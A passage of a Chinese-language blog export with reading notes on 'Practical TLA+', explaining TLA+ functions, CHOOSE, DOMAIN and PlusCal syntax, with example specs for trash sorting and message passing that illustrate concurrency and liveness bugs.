<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IndexOf(seq, elem) ==</span><br><span class="line">	CHOOSE i \in 1..Len(seq)</span><br><span class="line">&gt;&gt; IndexOf(&lt;&lt;8, 3, 1&gt;&gt;, 3)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>​    然后如果和逻辑词联结在一起的话会有一些比较棒的用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Max(set) == </span><br><span class="line">	CHOOSE x \in set: \A y \in set: x&gt;=y</span><br><span class="line">&gt;&gt; Max(1..10)</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<p>​    甚至可以解方程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHOOSE &lt;&lt;x,y&gt;&gt; \in (-10..10) \X (-10..10):</span><br><span class="line">	/\ 2*x + y = -2</span><br><span class="line">	/\ 3*x -2*y = 11</span><br></pre></td></tr></table></figure>
<h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p>​    一个函数是从输入到输出的一个映射，所有的函数都有如下形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[x \in set |-&gt; P(x)]</span><br><span class="line">/* 也可以改写成多元的</span><br><span class="line">[x \in set1, y \in set2 |-&gt; Q(x,y)]</span><br><span class="line">[x \in numbers |-&gt; x*2]</span><br></pre></td></tr></table></figure>
<p>​    为了使用一个函数，可以用<strong>f[bar]</strong>，这里指的是引用输出，就像前面的元组或结构，之前说它俩实际上是一种类型，这里解释一下，元组可以看成定义域是1..n的函数，结构可以看成定义域是一系列字符串的函数</p>
<p>​    类似于结构，我们可以指派函数，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flags == &#123;&quot;f1&quot;, &quot;f2&quot;&#125;</span><br><span class="line">(*--algorithm flags</span><br><span class="line">variable</span><br><span class="line">	flags = [f \in Flags |-&gt; FALSE];</span><br><span class="line">begin</span><br><span class="line">	with f \in Flags do</span><br><span class="line">		flags[f] := TRUE;</span><br><span class="line">	end with;</span><br><span class="line">end algorithm</span><br></pre></td></tr></table></figure>
<p>​    函数中的每一个f对应的值都会被改成TRUE</p>
<h2 id="Functions-and-Operators"><a href="#Functions-and-Operators" class="headerlink" title="Functions and Operators"></a>Functions and Operators</h2><p>​    我们可以把一个函数当作一个操作，如果操作没有参数的话有两种写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Op == [x \in S |-&gt; P(x)]</span><br><span class="line">Op[x \in S] == P(x)</span><br></pre></td></tr></table></figure>
<p>​    如果有参数的话就只有一种有效的写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MapToSomeNumber(set,num)==[x \in set |-&gt;num]</span><br></pre></td></tr></table></figure>
<p>​    但是函数和操作之间有着一点关键的差别，操作对输入是无所谓的，但是函数一定有它确定的定义域，但是他们对于迭代递归之类的都没有限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SumUpTo(n) ==</span><br><span class="line">	LET F[m \in 0..n] ==</span><br><span class="line">		IF m = 0 THEN 0</span><br><span class="line">		ELSE m + F[m-1]</span><br><span class="line">	IN F[n]</span><br></pre></td></tr></table></figure>
<p>​    然后针对递归，有一个相近的库函数ReduceSet</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PT == INSTANCE PT</span><br><span class="line">SumUpTo(n) ==</span><br><span class="line"> PT!ReduceSet(LAMBDA x, y: x + y, 0..n, 0)</span><br></pre></td></tr></table></figure>
<p>​    目前就当成一个模板去用吧，用之前需要导入库PT</p>
<h3 id="DOMAIN"><a href="#DOMAIN" class="headerlink" title="DOMAIN"></a>DOMAIN</h3><p>​    DOMAIN是一个给出函数可能的输入的操作，使用格式为DOMAIN func</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F[x \in BOOLEAN] == x</span><br><span class="line">G == &lt;&lt;6, 0, 9&gt;&gt;</span><br><span class="line">H == [F |-&gt; DOMAIN F, G |-&gt; DOMAIN G]</span><br><span class="line">&gt;&gt; H</span><br><span class="line">[F |-&gt; &#123;FALSE, TRUE&#125;, G |-&gt; 1..3]</span><br><span class="line">&gt;&gt; DOMAIN H</span><br><span class="line">&#123;&quot;F&quot;, &quot;G&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id><a href="#" class="headerlink" title="@@"></a>@@</h3><p>​    f @@ g合并了两个函数，来看一下这个操作的源程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Merge(f, g) == [</span><br><span class="line">	x \in (DOMAIN f) \union (DOMAIN g) |-&gt;</span><br><span class="line">	  IF x \in DOMAIN f THEN f[x] ELSE g[x]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>​    需要导入模块TLC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS TLC</span><br><span class="line">f[x \in 1..2] == &quot;a&quot;</span><br><span class="line">g[x \in 2..3] == &quot;b&quot;</span><br><span class="line">&gt;&gt; f @@ g</span><br><span class="line">&lt;&lt;&quot;a&quot;, &quot;a&quot;, &quot;b&quot;&gt;&gt;</span><br><span class="line">&gt;&gt; g @@ f</span><br><span class="line">&lt;&lt;&quot;a&quot;, &quot;b&quot;, &quot;b&quot;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="gt"><a href="#gt" class="headerlink" title=":&gt;"></a>:&gt;</h3><p>​    仍然需要模块TLC</p>
<p>​    a :&gt; b是函数[x \in {a} |-&gt; b]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; (2 :&gt; 3)[2]</span><br><span class="line">3</span><br><span class="line">&gt;&gt; (&quot;a&quot; :&gt; &quot;b&quot;).a</span><br><span class="line">&quot;b&quot;</span><br></pre></td></tr></table></figure>
<h2 id="函数集合"><a href="#函数集合" class="headerlink" title="函数集合"></a>函数集合</h2><p>​    这指的是从一个函数到另外一个函数，但是和之前的有一点区别，即[set1 -&gt; set2]，下面给几个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; [s \in &#123;&quot;a&quot;, &quot;b&quot;&#125; |-&gt; &#123;1, 2&#125;]</span><br><span class="line">[a |-&gt; &#123;1, 2&#125;, b |-&gt; &#123;1, 2&#125;]</span><br><span class="line">&gt;&gt; [&#123;&quot;a&quot;, &quot;b&quot;&#125; -&gt; &#123;1, 2&#125;]</span><br><span class="line">&#123; [a |-&gt; 1, b |-&gt; 1],</span><br><span class="line"> [a |-&gt; 1, b |-&gt; 2],</span><br><span class="line"> [a |-&gt; 2, b |-&gt; 1],</span><br><span class="line"> [a |-&gt; 2, b |-&gt; 2] &#125;</span><br></pre></td></tr></table></figure>
<p>​    现在我们来回忆以下之前的那个分类程序，我们中间利用了笛卡尔直角积来构造了一个随机集合，但是这样是很笨拙的，我们就可以利用这里的东西来进行简化</p>
<p>​    首先我们需要知道一点，TLC会将定义域为1..N的函数转化成列表，如[x \in 1..3 |-&gt; P(x)]，就会转化成&lt;<P(1), p(2),p(3)>&gt;，那我们另外考虑一下[1..3 -&gt; S]，其实仔细想一下，它代表的就是S \X S \X S，<del>这里我暂时不是很理解</del></P(1),></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SeqOf(set, count) == [1..count -&gt; set]</span><br></pre></td></tr></table></figure>
<p>​    然后就是对于之前的那个flag的例子可以做一个简短的优化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flags \in &#123;config \in [Flags -&gt; BOOLEAN]: \E f \in Flags: config[f]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><p>​    这里解决的是背包问题，其实从背包问题的解决就可以看出来TLA+的很多思路，就是通过设定一些操作来将整个过程描述出来，但是和编程的描述过程还不太一样</p>
<p>​    就比如背包问题，其实在TLA+中抽象之后就变得很简单，即先找出所有符合条件的可能性，然后在这些所有的可能性中寻找最佳的即可，即利用CHOOSE操作，将所有的可行的背包中的价值最大的找到</p>
<p>​    不过在输入随机时，有可能产生错误，即所有物品的价值全都是0，这个时候可以考虑再加入一些限制条件</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（二）</title>
    <url>/2021/08/24/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>​    Pluscal是一种可以编译成TLA+的语言，学习Pluscal比直接学习TLA+要简单很多，本章将涵盖除多进程算法和fair process之外的关于Plucal的知识</p>
<h1 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h1><h2 id="layout-of-spec"><a href="#layout-of-spec" class="headerlink" title="layout of spec"></a>layout of spec</h2><p>先在这里引入以下上一张的程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----(1)MODULE wire(2)----</span><br><span class="line">EXTENDS Integers \*(3)</span><br><span class="line">(*--algorithm wire \*(4)</span><br><span class="line">	variables (5)</span><br><span class="line">		people =&#123;&quot;alice&quot;,&quot;bob&quot;&#125;,</span><br><span class="line">		acc=[alice |-&gt;5,bob \-&gt;5];</span><br><span class="line">begin \*(6)</span><br><span class="line">	skip;</span><br><span class="line">end algorithm;*)(4)</span><br><span class="line">==== \*(1)</span><br></pre></td></tr></table></figure>
<p>我们所有写出的spec都有着以上的格式，即</p>
<ol>
<li>必须以MODULE开始，并且其两侧至少有四个’-‘，结尾最后一行也必须有四个‘=’，在这上面和下面的东西都会被忽略，经常会放一些<strong>metadata</strong></li>
<li>MODULE的名字必须和文件的名字相同</li>
<li>关键字<strong>EXTENDS</strong>用来加载模块</li>
<li>*是行注释，(*…*)是块注释，Pluscal放在块注释中，因此解析器会忽略他，整体以<strong>—algorithm name</strong>开头，以<strong>end algorithm;</strong>结束，算法的名字和文件名没有直接关系</li>
<li>在算法内部用variables声明并初始化变量，变量之间以逗号或分号分隔开</li>
<li>在begin处开始写算法本身</li>
</ol>
<h2 id="表达式（expressions）"><a href="#表达式（expressions）" class="headerlink" title="表达式（expressions）"></a>表达式（expressions）</h2><p>​    在表达式中的只能是值（value）或操作（operator），这里暂时先使用标准库中的操作，到后面我们完全有能力自己写一种操作</p>
<p>​    现在先介绍一种方式，可以不用运行整段spec就可以检查他的正确性，即<strong>expression evaluator</strong>。我们在model中打开model checking results，其中有窗口<strong>Evaluate Constant Expression</strong>，在expression部分输入表达式，运行后在value处可以给出值。当然这样的话仍然会检查spec，勾选旁边的<strong>No Behavior Spec</strong>选项就可以只运行表达式</p>
<h2 id="值（values）"><a href="#值（values）" class="headerlink" title="值（values）"></a>值（values）</h2><p>​    在TLA+中有四种基本的值类型，即字符串型、整形、布尔型和模型值。没有浮点型，模型值（<strong>model value</strong>）这里先略过，字符串型必须用被双引号包括。</p>
<p>​    标准操作如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Operations</th>
<th style="text-align:center">Meaning</th>
<th style="text-align:center">Examples</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">x=y</td>
<td style="text-align:center">相等</td>
<td style="text-align:center">1=2  FALSE</td>
</tr>
<tr>
<td style="text-align:center">x/=y或x#y</td>
<td style="text-align:center">不相等</td>
<td style="text-align:center">1/=2  TRUE</td>
</tr>
<tr>
<td style="text-align:center">x/\y</td>
<td style="text-align:center">且</td>
<td style="text-align:center">TRUE/\FALSE  FALSE</td>
</tr>
<tr>
<td style="text-align:center">x\/y</td>
<td style="text-align:center">或</td>
<td style="text-align:center">TRUE\/FALSE  FALSE</td>
</tr>
<tr>
<td style="text-align:center">x:=y</td>
<td style="text-align:center">分配</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">~x</td>
<td style="text-align:center">否定</td>
<td style="text-align:center">~TRUE  FALSE</td>
</tr>
</tbody>
</table>
</div>
<p><strong><em>注意区分一下=和:=，在原始的TLA+中只有相等而没有指派，这指的是：如果x没有初始化而想要将其初始化为1或者x已经初始化而想要将其和1作比较，应该用x’=1</em></strong>    <strong><em>然后我们做如下规定，即，如果是第一次使用该变量，=作为初始化使用，在其他情况下，=是相等，:=是分配，例如写变量x=2,y=x,z=(x=y)，将会得到x=2,y=2,z=TRUE</em></strong></p>
<p>​    当我们导入Integers模块时，我们就得到了运算符号，即<strong>+ - % *</strong>，这里面的整数除法是<strong>\div</strong>，但是不支持十进制除法，另外就是<strong>..</strong>运算符表示列表</p>
<p>​    然后就是四种构造类型，即<strong>集合（set），元组（tuples）或称序列（sequences），结构（structures），函数（functions）</strong></p>
<h3 id="集合（sets）"><a href="#集合（sets）" class="headerlink" title="集合（sets）"></a>集合（sets）</h3><p>​    集合很显然，但是要求就是内部的元素类型必须相同，以下是一些基本的运算</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Operator</th>
<th style="text-align:center">Meanings</th>
<th style="text-align:center">Examples</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">x \in set</td>
<td style="text-align:center">x在集合中</td>
<td style="text-align:center">1 \in 1..2  TRUE</td>
</tr>
<tr>
<td style="text-align:center">x \notin set或~(x \in set)</td>
<td style="text-align:center">x不在集合中</td>
<td style="text-align:center">1 \notin 1..2  FALSE</td>
</tr>
<tr>
<td style="text-align:center">set1 \subesteq set2</td>
<td style="text-align:center">子集关系</td>
<td style="text-align:center">1..2 \subseteg 1..3 TRUE</td>
</tr>
<tr>
<td style="text-align:center">set1 \union set2</td>
<td style="text-align:center">并集</td>
<td style="text-align:center">1..2 \union 2..3  1..3</td>
</tr>
<tr>
<td style="text-align:center">set1 \intersect set2</td>
<td style="text-align:center">交集</td>
<td style="text-align:center">1..2 \intersect 2..3 {2}</td>
</tr>
<tr>
<td style="text-align:center">Cardinality(set)</td>
<td style="text-align:center">返回元素个数</td>
<td style="text-align:center">Cardinality(1..2) 2</td>
</tr>
</tbody>
</table>
</div>
<p><strong><em>当然需要注意的是其中的交集和并集分别可以写为\cap和\cup</em></strong></p>
<p>集合中也有两种常见的写法，即<strong>{x \in set: conditional}和{expression: x \in set}</strong></p>
<h3 id="元素或列表"><a href="#元素或列表" class="headerlink" title="元素或列表"></a>元素或列表</h3><p>​    该种结构的元素有序，并且类型可以不一样，在<strong>&lt;&lt;&gt;&gt;</strong>之间，和数组一样的索引方式，但是是从1开始索引的，我们导入Sequences模块，可以得到一些新的表达式，这里的一些定义感觉和广义表差不多</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Operator</th>
<th style="text-align:center">Meaning</th>
<th style="text-align:center">Example</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Head(seq)</td>
<td style="text-align:center">get head of seq</td>
<td style="text-align:center">Head(&lt;<1,2>&gt;)  1</1,2></td>
</tr>
<tr>
<td style="text-align:center">Tail(seq)</td>
<td style="text-align:center">get tail of seq</td>
<td style="text-align:center">Tail(&lt;<1,2,3>&gt;)  &lt;<2,3>&gt;</2,3></1,2,3></td>
</tr>
<tr>
<td style="text-align:center">Append(seq,x)</td>
<td style="text-align:center">Append</td>
<td style="text-align:center">Append(&lt;<1,2>&gt;,3)  &lt;<1,2,3>&gt;</1,2,3></1,2></td>
</tr>
<tr>
<td style="text-align:center">seq1 \o seq2</td>
<td style="text-align:center">Combine</td>
<td style="text-align:center">&lt;<1>&gt; \o &lt;<2>&gt;  &lt;<1,2>&gt;</1,2></2></1></td>
</tr>
<tr>
<td style="text-align:center">Len(seq)</td>
<td style="text-align:center">get length of seq</td>
<td style="text-align:center">Len(&lt;<1,2>&gt;)  2</1,2></td>
</tr>
</tbody>
</table>
</div>
<p>对于Tuples和Sequences，如果不需要使用对seq的操作时就声明前者，否则声明后者</p>
<h3 id="结构（Structures）"><a href="#结构（Structures）" class="headerlink" title="结构（Structures）"></a>结构（Structures）</h3><p>​    结构将值指派给字符串，可以按照如下格式声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[key1 |-&gt; val1,key2 |-&gt;val2, etc]</span><br></pre></td></tr></table></figure>
<p>​    可以通过Structures.key1来得到值</p>
<h2 id="算法结构"><a href="#算法结构" class="headerlink" title="算法结构"></a>算法结构</h2><h3 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h3><p>​    采用:=来给一个变量分配一个新的值</p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>​    添加模块TLC可以使用断言，添加断言可以通过测试不变量来测试某个表达式是否成立，assert expression</p>
<h3 id="skip"><a href="#skip" class="headerlink" title="skip"></a>skip</h3><p>​    没有任何操作，可以通过skip来填充我们尚未完成的部分</p>
<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if condition1 then</span><br><span class="line">	body</span><br><span class="line">elsif condition2 then</span><br><span class="line">	body</span><br><span class="line">else</span><br><span class="line">	body</span><br><span class="line">end if;</span><br></pre></td></tr></table></figure>
<p>​    if不是唯一的分支结构，其余的将在后面介绍</p>
<h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while condition do</span><br><span class="line">	body</span><br><span class="line">end while;</span><br></pre></td></tr></table></figure>
<p>​    这是PlusCal中唯一的循环体</p>
<h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><p>​    可以在begin前使用来变得更简洁一些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">macro name(arg1,arg2) begin</span><br><span class="line"> \* assignments</span><br><span class="line">end macro;</span><br><span class="line">begin</span><br><span class="line">	name(x,y);</span><br><span class="line">end algorithm;</span><br></pre></td></tr></table></figure>
<p>​    可以加入分配、断言、判断，但不能是循环，<strong>也不能指配任何变量超过一次（这里不太理解）</strong>，可以引用外部值，也可以指配外部变量，maybe it seems like the function in some programming languege like C. In the next example we can use it to clean our TLA+. <strong>But in fact I don’ t know why visit the element in a structure in this way</strong></p>
<p><strong><em>ok, as I read again, I realized that the structures and sequences are the same data structures, so in this angle I think this way is right</em></strong></p>
<h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----MODULE test----</span><br><span class="line">EXTENDS Integers,TLC,Sequences,FiniteSets</span><br><span class="line">(*--algorithm sort</span><br><span class="line">variable</span><br><span class="line">    dustbin = [trash |-&gt;&#123;&#125;,recycle |-&gt;&#123;&#125;],</span><br><span class="line">    count =[trash |-&gt; 0,recycle |-&gt;0],</span><br><span class="line">    capacity =[trash |-&gt; 10,recycle |-&gt;10],</span><br><span class="line">    items = &lt;&lt;</span><br><span class="line">        [type |-&gt; &quot;recycle&quot;, size |-&gt; 5],</span><br><span class="line">        [type |-&gt; &quot;trash&quot;,size |-&gt;5],</span><br><span class="line">        [type |-&gt; &quot;recycle&quot;,size |-&gt;4],</span><br><span class="line">        [type |-&gt;&quot;recycle&quot;,size |-&gt;4]</span><br><span class="line">    &gt;&gt;,</span><br><span class="line">    cur=&quot;&quot;;</span><br><span class="line">macro add_item(type) begin</span><br><span class="line">        capacity[type] := capacity[type] -cur.size;</span><br><span class="line">        dustbin[type] := dustbin[type] \union &#123;cur&#125;;</span><br><span class="line">        count[type] := count[type] + 1;</span><br><span class="line">end macro;</span><br><span class="line">begin</span><br><span class="line">    while items /= &lt;&lt;&gt;&gt; do</span><br><span class="line">    cur := Head(items);</span><br><span class="line">    items := Tail(items);</span><br><span class="line">    if cur.type = &quot;recycle&quot;/\ cur.size&lt;=capacity.recycle then</span><br><span class="line">        add_item(&quot;recycle&quot;);</span><br><span class="line">    elsif cur.type =&quot;trash&quot;/\cur.size&lt;=capacity.trash then</span><br><span class="line">        add_item(&quot;trash&quot;);</span><br><span class="line">    end if;</span><br><span class="line">    end while;</span><br><span class="line">    assert capacity.recycle&gt;=0 /\ capacity.trash&gt;=0;</span><br><span class="line">    assert Cardinality(dustbin.trash) = count.trash;</span><br><span class="line">    assert Cardinality(dustbin.recycle) = count.recycle;</span><br><span class="line">end algorithm*)</span><br><span class="line">=====</span><br></pre></td></tr></table></figure>
<h2 id="Complex-Behaviors"><a href="#Complex-Behaviors" class="headerlink" title="Complex Behaviors"></a>Complex Behaviors</h2><p>​    其实根据这几天的学习，我们已经能够去写一些很简单的spec了，但是我们需要让这些东西变得更加使用，下面介绍三种基本的方式</p>
<h3 id="Multiple-Starting-States"><a href="#Multiple-Starting-States" class="headerlink" title="Multiple Starting States"></a>Multiple Starting States</h3><p>​    我们可以采用更加多元化的方式来声明变量，而不是仅仅用赋值号，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(*--algorithm in</span><br><span class="line">variables x \in 1..3;</span><br><span class="line">begin</span><br><span class="line">	assert x&lt;=2;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    可以用来逐个表示集合中的元素，直到x=3退出，也可以用同样的方式再添加一些像y之类的变量，需要提一下的是，TLA+给出了布尔类型的集合BOOLEAN {TRUE,FALSE}。</p>
<p>​    从上面的论述我们可以知道通过这一点我们可以创造出任意的数，也可以用类似的方式选择出任意的集合、结构和元组。</p>
<p>​    首先，对于集合，有操作SUBSET set，可以求出集合set的幂集，也有操作UNION {set1,set2,etc}，可以求出多个集合的并集，另外就是set1 \X set2，求出笛卡尔积，可以用它来创造列表的集合，最后就是创造结构的集合，我们采用[key : set]的格式，比如[a : {“a”,”b”}]，表示的就是{[a |-&gt; “a”], [a |-&gt; “b”]}，当然结构中也可以写多个上述的格式，得到的最终形式类似于笛卡尔积，如[a: {“a”, “b”}, b: (1..2)]，当然如果想要保持其中的一个量不变，另一个跟随集合而取，可以写成[key1: set, key2: {val}]</p>
<p>​    注意以上的东西原则上都是可以混用的，接下来我们重写上面的分类垃圾的例子，来达到随机的效果，<strong>得到列表，用笛卡尔积，得到结构，用多个组合</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">variables</span><br><span class="line">	capacity \in [trash: 1..10, recycle: 1..10],</span><br><span class="line">	bins = [trash |-&gt; &#123;&#125;,recycle |-&gt;&#123;&#125;],</span><br><span class="line">	count =[trash |-&gt; 0,recycle |-&gt; 0],</span><br><span class="line">	item =[type: &#123;&quot;recycle&quot;,&quot;trash&quot;&#125;,size: 1..6],</span><br><span class="line">	items \in item \X item \X item \X item,</span><br><span class="line">	curr =&quot;&quot;;</span><br></pre></td></tr></table></figure>
<p>​    首先的话这次运行的程序明显比之前要慢很多，因为可能性实在是太多了，还有值得优化的地方，其次就是对于assert，程序出错了</p>
<p>​    值得优化的地方有很多，比如这里的bins采用的是集合，对于取并集的操作会产生一定的错误，因为{x} \UNION {x}={x}，这就导致了如果我们处理两个完全相同的物品，箱里只加了一次，但是数目加了两次，这就是由于<strong>集合的互异性</strong>造成的，所以如果这里使用列表可以有效地修正这一错误，最终的修改总代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----MODULE test----</span><br><span class="line">EXTENDS Integers,TLC,Sequences,FiniteSets</span><br><span class="line">(*--algorithm sort</span><br><span class="line">variable</span><br><span class="line">    capacity \in [trash: 1..10, recycle: 1..10],</span><br><span class="line">    dustbin = [trash |-&gt; &lt;&lt;&gt;&gt;,recycle |-&gt;&lt;&lt;&gt;&gt;],</span><br><span class="line">    count =[trash |-&gt; 0,recycle |-&gt; 0],</span><br><span class="line">    item =[type: &#123;&quot;recycle&quot;,&quot;trash&quot;&#125;,size: 1..6],</span><br><span class="line">    items \in item \X item \X item \X item,</span><br><span class="line">    cur =&quot;&quot;;</span><br><span class="line">macro add_item(type) begin</span><br><span class="line">        capacity[type] := capacity[type] -cur.size;</span><br><span class="line">        dustbin[type] := Append(dustbin[type],cur);</span><br><span class="line">        count[type] := count[type] + 1;</span><br><span class="line">end macro;</span><br><span class="line">begin</span><br><span class="line">    while items /= &lt;&lt;&gt;&gt; do</span><br><span class="line">    cur := Head(items);</span><br><span class="line">    items := Tail(items);</span><br><span class="line">    if cur.type = &quot;recycle&quot;/\ cur.size&lt;=capacity.recycle then</span><br><span class="line">        add_item(&quot;recycle&quot;);</span><br><span class="line">    elsif cur.type =&quot;trash&quot;/\cur.size&lt;=capacity.trash then</span><br><span class="line">        add_item(&quot;trash&quot;);</span><br><span class="line">    end if;</span><br><span class="line">    end while;</span><br><span class="line">    assert capacity.recycle&gt;=0 /\ capacity.trash&gt;=0;</span><br><span class="line">    assert Len(dustbin.trash) = count.trash;</span><br><span class="line">    assert Len(dustbin.recycle) = count.recycle;</span><br><span class="line">end algorithm*)</span><br><span class="line">=========</span><br></pre></td></tr></table></figure>
<h3 id="Nondeterministic-Behavior"><a href="#Nondeterministic-Behavior" class="headerlink" title="Nondeterministic Behavior"></a>Nondeterministic Behavior</h3><p>​    并不是所有的行为都是确定的，在PlusCal中有两个关键字用来模拟不确定性</p>
<p><strong>Either</strong></p>
<p>​    大致的语法格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">either</span><br><span class="line">	\* branch 1</span><br><span class="line">or</span><br><span class="line">	\* branch 2</span><br><span class="line">\* ...</span><br><span class="line">or</span><br><span class="line">	\* branch n</span><br><span class="line">end either;</span><br></pre></td></tr></table></figure>
<p>​    当我们开始核实的时候，TLC将会同时检查所有的分支，可以通过这一点来展示所有的可能情况，但是每种情况都是等可能的，一旦其中有一个让spec无效，都要去修正它，在分支中可以放任何表达式，如果可以让macro有效，可以将either放入macro中</p>
<p><strong>With</strong></p>
<p>​    大致的语法格式有两种，见下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with var = value do</span><br><span class="line">	\* body</span><br><span class="line">end with;</span><br><span class="line">\* or</span><br><span class="line">with var \in set do</span><br><span class="line">	\*body</span><br><span class="line">end with;</span><br></pre></td></tr></table></figure>
<p>​    前一种用法大概是创建了一个临时变量，后面一种情况是不确定性的应用，将会检查集合中的每一个元素所对应的情况，如果集合为空，此处的spec将会停止。</p>
<p>​    with语句给的是值而不是参照，在书中给了一个比较清晰的例子，即如果x和y是变量，通过写with t \in {x,y} do t := 1来为其重新赋值是不可以的，仅仅只能写 with t \in {x,y} do x := t。</p>
<p><strong>example</strong></p>
<p>​    这个问题大概就是说有个人送信到中转站，收信的人可以选择收也可以选择不收，我们直译以下就得到了以下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----MODULE test----</span><br><span class="line">EXTENDS Sequences,TLC</span><br><span class="line">(*--algorithm message</span><br><span class="line">variable</span><br><span class="line">    to_send = &lt;&lt;1,2,3&gt;&gt;,</span><br><span class="line">    receiver = &lt;&lt;&gt;&gt;,</span><br><span class="line">    in_transit = &#123;&#125;;</span><br><span class="line">begin</span><br><span class="line">    while Len(receiver) /= 3 do</span><br><span class="line">    if Len(to_send) /= 0 then</span><br><span class="line">        in_transit := in_transit \union &#123;Head(to_send)&#125;;</span><br><span class="line">        to_send := Tail(to_send);</span><br><span class="line">    end if;</span><br><span class="line">    either</span><br><span class="line">        with msg \in in_transit do</span><br><span class="line">            receiver := Append(receiver,msg);    </span><br><span class="line">            in_transit := in_transit \ &#123;msg&#125;;</span><br><span class="line">        end with;</span><br><span class="line">    or</span><br><span class="line">        skip;</span><br><span class="line">    end either;</span><br><span class="line">    end while;</span><br><span class="line">end algorithm;*)</span><br><span class="line">====</span><br></pre></td></tr></table></figure>
<p>​    注意如果在最下面加入断言assert receiver = &lt;<1,2,3>&gt;会报错，这个错误是由于高并发造成的，称之为<strong>concurrency bugs</strong>，即送1，收件人没收，然后送2，然后收件人收1，送3，然后收3，2，导致顺序发生变化，所以这里可以加入一个判定，保证在上一封信被收到的时候，下一封信才可以寄出，进而保证了有序性</1,2,3></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----MODULE test----</span><br><span class="line">EXTENDS Sequences,TLC</span><br><span class="line">(*--algorithm message</span><br><span class="line">variable</span><br><span class="line">    to_send = &lt;&lt;1,2,3&gt;&gt;,</span><br><span class="line">    receiver = &lt;&lt;&gt;&gt;,</span><br><span class="line">    in_transit = &#123;&#125;;</span><br><span class="line">    can_send = TRUE</span><br><span class="line">begin</span><br><span class="line">    while Len(receiver) /= 3 do</span><br><span class="line">    if can_send /\ Len(to_send) /= 0 then</span><br><span class="line">        in_transit := in_transit \union &#123;Head(to_send)&#125;;</span><br><span class="line">        to_send := Tail(to_send);</span><br><span class="line">        can_send := FALSE;</span><br><span class="line">    end if;</span><br><span class="line">    either</span><br><span class="line">        with msg \in in_transit do</span><br><span class="line">            can_send := TRUE;</span><br><span class="line">            receiver := Append(receiver,msg);    </span><br><span class="line">            in_transit := in_transit \ &#123;msg&#125;;</span><br><span class="line">        end with;</span><br><span class="line">    or</span><br><span class="line">        skip;</span><br><span class="line">    end either;</span><br><span class="line">    end while;</span><br><span class="line">    assert receiver = &lt;&lt;1,2,3&gt;&gt;;</span><br><span class="line">end algorithm;*)</span><br><span class="line">======</span><br></pre></td></tr></table></figure>
<p>​    但是这样改动也会造成一个问题，就是发出去的信永远都没收到，这样就永远无法寄信，这称之为<strong>liveness bugs</strong>，未来会更加详细的介绍它</p>
<p>​    当然在现实中也会有一些别的情况，比如信收到了但是邮差却误以为没有收导致报错，只需要在加入either即可</p>
